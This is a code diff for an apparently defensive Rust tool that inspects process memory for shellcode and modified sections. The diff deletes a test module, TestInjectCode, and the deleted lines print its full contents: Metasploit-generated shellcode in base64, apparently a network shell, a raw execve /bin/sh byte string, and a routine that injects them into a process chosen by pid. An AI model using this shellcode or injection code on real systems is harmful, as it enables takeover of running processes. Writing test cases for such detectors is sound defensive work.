@@ -195,47 +195,6 @@ impl STModule for CheckModifiedSectionV1 {
     }
 }
 
-pub struct TestInjectCode {}
-
-impl STModule for TestInjectCode {
-    fn run(&self, args: &STArgs) -> Result<STResult, STError> {
-        //metasploit generate shellcode, Just for test
-        let base64_code = "ailYmWoCX2oBXg8FSJdSxwQkAgAnD0iJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf/m";
-        let code2 =
-            b"\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
-                .to_vec();
-        let mut code = [0 as u8; 1024];
-        let code = base64::decode(base64_code).unwrap();
-        if args.contains_key("pid") == false {
-            return Err(STError::new("TestInjectCode module must set pid"));
-        }
-
-        let pid = args.get("pid").unwrap().parse::<u32>();
-        let pid = match pid {
-            Ok(_pid) => _pid,
-            Err(err) => {
-                return Err(STError::from(Box::new(err)));
-            }
-        };
-
-        let p = Process::new(pid);
-        p.inject_code(&code);
-        Ok(STResult {})
-    }
-
-    fn helper(&self) -> String {
-        "TestInjectCode pid=${pid}".to_string()
-    }
-
-    fn get_name(&self) -> String {
-        "TestInjectCode".to_string()
-    }
-
-    fn get_detail(&self) -> String {
-        "".to_string()
-    }
-}
-
 pub struct CheckShellcode {}
 
 impl STModule for CheckShellcode {
@@ -285,7 +244,6 @@ impl STModule for ProcessStrings {
         }
 
         let codecs = Option::<String>::default();
-        let pid = args.get("pid").unwrap().parse::<u32>();
         let pid = args.get("pid").unwrap().parse::<u32>();
         let pid = match pid {
             Ok(_pid) => _pid,
@@ -343,7 +301,7 @@ impl STModule for ProcessStrings {
                         }
                         start_m = end_m;
                         let addr = m_start + start_m as u64;
-                        println!("{:x} {}", addr, sub);
+                        println!("0x{:x} {}", addr, sub);
                         continue;
                     }
                     end_m += 1;
